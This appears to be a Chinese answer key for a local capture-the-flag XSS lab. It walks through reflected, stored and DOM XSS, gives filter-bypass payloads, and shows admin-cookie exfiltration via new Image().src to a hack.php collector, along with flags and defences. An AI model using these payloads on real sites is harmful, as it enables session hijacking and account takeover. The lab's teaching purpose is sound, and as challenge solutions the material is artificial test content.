# 题解：xss 模块（xs1~xs4）

> ⚠️ 请先把 4 道题全部做出来，再来看这里！

## xs1 反射型（Reflected XSS）

```url
http://localhost:8084/xs1/?q=<script>alert(1)</script>
```

**讲解**：`?q=` 参数被 `echo` 原样输出到 HTML，浏览器把 `<script>` 当代码执行。
**考点本质**：反射型 = 一次性，payload 在 URL 里，需要受害者点恶意链接。

## xs2 存储型（Stored XSS）

```powershell
curl.exe -d 'msg=<script>alert(2)</script>' http://localhost:8084/xs2/
```

**讲解**：留言被存进 messages.txt，所有访问留言板的人都执行脚本。
**考点本质**：存储型 = 持久化 + 影响所有人，**能打管理员**（管理员看后台也中招）——最危险的类型。

## xs3 DOM 型（DOM-based XSS）

```url
http://localhost:8084/xs3/#<img src=x onerror=alert(1)>
```

**讲解**：payload 在 `#` 后面（location.hash），**不发给服务器**！前端 JS 直接 innerHTML 拼接。服务器日志里没有 payload 痕迹。
**考点本质**：DOM 型 = 纯前端漏洞，识别方法：F12 看 JS 是否把 URL/输入直接写进 innerHTML/document.write。

## xs4 偷 Cookie（Cookie Stealing）

```url
http://localhost:8084/xs4/?q=<script>new Image().src='/xss/hack.php?c='+document.cookie</script>
```

然后查看攻击者服务器收集结果：
```url
http://localhost:8084/xss/stolen.txt
```

**讲解**：`new Image().src=...` 是经典的'无痕外带'技巧——创建一个图片对象，把数据拼在 URL 里发给攻击者服务器，页面无感知。
**考点本质**：Cookie 没设 HttpOnly 就能被偷。防御：HttpOnly + 输出转义。

## xs5 过滤绕过（删除式过滤）

```url
http://localhost:8084/xs5/?q=<img src=x onerror=confirm(1)>
```

**讲解**：过滤删了 <script>、</script>、alert（大小写不敏感）。但：
- onerror 没被删 → 换标签：<img src=x onerror=...>
- confirm/prompt 没被删 → 换函数（alert 被删）
- 嵌套绕过（针对删'完整标签'的过滤）：<scr<script>ipt>alert(1)</scr</script>ipt> → 删掉中间的 <script> 后还原成 <script>alert(1)</script>

**考点本质**：黑名单永远列不全——**换标签、换函数、换事件**。注意：如果过滤删的是**裸子串**（'script' 不带尖括号），嵌套法无效（xs7 就是）。

## xs6 存储型打管理员（业务联动）

1. 留言板注入偷 Cookie payload（存储型，无过滤）：
```html
<script>new Image().src='/xss/hack.php?c='+document.cookie</script>
```
2. 访问 /xs6/admin.php 模拟管理员查看留言 → 浏览器执行 payload → admin_session Cookie 被外带
3. 查看 /xss/stolen.txt → 得到 flag{xs6_admin_cookie}

**考点本质**：**存储型 XSS 打管理员 = 拿站**——管理员会话被偷，攻击者冒充管理员。这是存储型 XSS 最大的危害场景。

## xs7 综合毕业考（多重过滤 + 偷 Cookie）

过滤删：script / onerror / onload / alert（裸子串，大小写不敏感）。

**嵌套法无效**（删的是裸子串，还原不了）——换事件 + 自动触发：

```html
<input onfocus="new Image().src='/xss/hack.php?c='+document.cookie" autofocus>
```

- onfocus 不在黑名单（onerror/onload 被拦，但事件有几十个）
- autofocus 自动聚焦 → **无需用户交互自动触发**
- 留言 → 访问 /xs7/admin.php → 看 /xss/stolen.txt → flag{xs7_final_graduate}

**考点本质**：绕过 = 换事件 + 换函数 + 自动触发机制；利用 = 存储型 + 外带 + 会话劫持。**全链路**。

## 小结

| 类型 | 特征 | 危害 |
|------|------|------|
| 反射 | URL 带 payload，一次性 | 钓鱼、配合 CSRF |
| 存储 | 入库，所有人中招 | 打管理员 = 拿站 |
| DOM | 不经过服务器 | 隐蔽，服务器无日志 |
| 绕过 | 黑名单删字符串 | 换标签/函数/事件/自动触发 |

防御三件套：输出转义（htmlspecialchars）+ HttpOnly Cookie + CSP

题目清单（7 题）：xs1 反射 / xs2 存储 / xs3 DOM / xs4 偷Cookie / xs5 绕过 / xs6 打管理员 / xs7 毕业考